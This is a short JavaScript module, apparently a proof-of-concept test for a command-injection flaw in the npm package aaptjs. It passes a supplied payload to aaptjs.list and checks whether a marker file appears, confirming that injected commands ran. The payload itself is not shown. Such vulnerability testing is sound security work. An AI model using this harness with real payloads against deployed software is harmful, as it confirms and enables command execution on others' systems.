function exploitFunction(payload) {
  const aaptjs = require("aaptjs");
  const fs = require("fs");
  const path = "./aaptjs";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  aaptjs.list(payload, (err, data) => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      if (err) {
        console.error(err);
      }
      process.nextTick(() => {
        process.exit(0);
      });
    });
  });
}

module.exports = { exploitFunction };